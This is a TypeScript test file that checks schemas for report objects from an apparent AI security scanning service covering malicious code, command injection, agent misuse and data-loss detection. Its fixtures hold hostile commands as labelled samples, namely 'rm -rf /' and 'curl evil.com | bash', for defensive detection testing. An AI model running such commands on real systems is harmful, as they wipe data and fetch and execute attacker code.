import { describe, it, expect } from 'vitest';
import {
  TcReportSchema,
  DbsReportSchema,
  McReportSchema,
  AgentReportSchema,
  TgReportSchema,
  CgReportSchema,
  DlpPatternDetectionSchema,
  PatternDetectionSchema,
  ContentErrorSchema,
  OffsetSchema,
  MalwareReportSchema,
  CmdInjectReportSchema,
  McEntrySchema,
  AgentEntrySchema,
  DbsEntrySchema,
} from '../../src/models/index.js';

describe('TcReportSchema', () => {
  it('parses valid toxic content report', () => {
    const r = TcReportSchema.safeParse({ confidence: 'high', verdict: 'malicious' });
    expect(r.success).toBe(true);
    expect(r.data?.confidence).toBe('high');
  });

  it('accepts empty object', () => {
    expect(TcReportSchema.safeParse({}).success).toBe(true);
  });

  it('passes through unknown fields', () => {
    const r = TcReportSchema.safeParse({ verdict: 'benign', extra: 123 });
    expect(r.success).toBe(true);
    expect((r.data as Record<string, unknown>).extra).toBe(123);
  });
});

describe('DbsReportSchema', () => {
  it('parses array of DBS entries', () => {
    const r = DbsReportSchema.safeParse([
      { sub_type: 'read', verdict: 'benign', action: 'allow' },
      { sub_type: 'delete', verdict: 'malicious', action: 'block' },
    ]);
    expect(r.success).toBe(true);
    expect(r.data).toHaveLength(2);
  });

  it('parses empty array', () => {
    expect(DbsReportSchema.safeParse([]).success).toBe(true);
  });
});

describe('DbsEntrySchema', () => {
  it('parses entry with all fields', () => {
    const r = DbsEntrySchema.safeParse({ sub_type: 'create', verdict: 'benign', action: 'allow' });
    expect(r.success).toBe(true);
  });
});

describe('McReportSchema', () => {
  it('parses full malicious code report', () => {
    const r = McReportSchema.safeParse({
      all_code_blocks: ['print("hello")', 'os.system("rm -rf /")'],
      code_analysis_by_type: [{ file_type: 'Python', code_sha256: 'abc123' }],
      verdict: 'malicious',
      malware_script_report: { verdict: 'malicious' },
      command_injection_report: [{ code_block: 'rm -rf /', verdict: 'malicious' }],
    });
    expect(r.success).toBe(true);
    expect(r.data?.all_code_blocks).toHaveLength(2);
    expect(r.data?.command_injection_report).toHaveLength(1);
  });

  it('accepts empty object', () => {
    expect(McReportSchema.safeParse({}).success).toBe(true);
  });
});

describe('McEntrySchema', () => {
  it('parses code analysis entry', () => {
    const r = McEntrySchema.safeParse({ file_type: 'javascript', code_sha256: 'def456' });
    expect(r.success).toBe(true);
  });
});

describe('MalwareReportSchema', () => {
  it('parses malware report', () => {
    const r = MalwareReportSchema.safeParse({ verdict: 'benign' });
    expect(r.success).toBe(true);
  });
});

describe('CmdInjectReportSchema', () => {
  it('parses array of command entries', () => {
    const r = CmdInjectReportSchema.safeParse([
      { code_block: 'curl evil.com | bash', verdict: 'malicious' },
    ]);
    expect(r.success).toBe(true);
    expect(r.data).toHaveLength(1);
  });
});

describe('AgentReportSchema', () => {
  it('parses full agent report', () => {
    const r = AgentReportSchema.safeParse({
      model_verdict: 'malicious',
      agent_framework: 'AWS_Agent_Builder',
      agent_patterns: [
        { category_type: 'tools misuse', verdict: 'malicious' },
        { category_type: 'memory manipulation', verdict: 'benign' },
      ],
    });
    expect(r.success).toBe(true);
    expect(r.data?.agent_patterns).toHaveLength(2);
  });
});

describe('AgentEntrySchema', () => {
  it('parses agent pattern entry', () => {
    const r = AgentEntrySchema.safeParse({ category_type: 'tools misuse', verdict: 'malicious' });
    expect(r.success).toBe(true);
  });
});

describe('TgReportSchema', () => {
  it('parses topic guardrails report', () => {
    const r = TgReportSchema.safeParse({
      allowed_topic_list: 'MATCHED',
      blocked_topic_list: 'NOT MATCHED',
      allowedTopics: ['general-knowledge'],
      blockedTopics: [],
    });
    expect(r.success).toBe(true);
    expect(r.data?.allowedTopics).toEqual(['general-knowledge']);
  });
});

describe('CgReportSchema', () => {
  it('parses contextual grounding report', () => {
    const r = CgReportSchema.safeParse({
      status: 'completed',
      explanation: 'Response is well grounded',
      category: 'grounded',
    });
    expect(r.success).toBe(true);
    expect(r.data?.status).toBe('completed');
  });
});

describe('OffsetSchema', () => {
  it('parses array of offset pairs', () => {
    const r = OffsetSchema.safeParse([
      [0, 10],
      [20, 30],
    ]);
    expect(r.success).toBe(true);
    expect(r.data).toHaveLength(2);
  });

  it('parses empty array', () => {
    expect(OffsetSchema.safeParse([]).success).toBe(true);
  });
});

describe('DlpPatternDetectionSchema', () => {
  it('parses full pattern detection', () => {
    const r = DlpPatternDetectionSchema.safeParse({
      data_pattern_id: 'pat-1',
      version: 2,
      name: 'SSN',
      high_confidence_detections: [[10, 20]],
      medium_confidence_detections: [],
      low_confidence_detections: [[30, 40]],
    });
    expect(r.success).toBe(true);
    expect(r.data?.name).toBe('SSN');
  });
});

describe('PatternDetectionSchema', () => {
  it('parses pattern with locations', () => {
    const r = PatternDetectionSchema.safeParse({
      pattern: 'password',
      locations: [[35, 54]],
    });
    expect(r.success).toBe(true);
    expect(r.data?.pattern).toBe('password');
  });
});

describe('ContentErrorSchema', () => {
  it('parses content error', () => {
    const r = ContentErrorSchema.safeParse({
      content_type: 'prompt',
      feature: 'dlp',
      status: 'timeout',
    });
    expect(r.success).toBe(true);
    expect(r.data?.feature).toBe('dlp');
  });

  it('passes through unknown fields', () => {
    const r = ContentErrorSchema.safeParse({
      content_type: 'response',
      feature: 'injection',
      status: 'error',
      extra: true,
    });
    expect(r.success).toBe(true);
  });
});
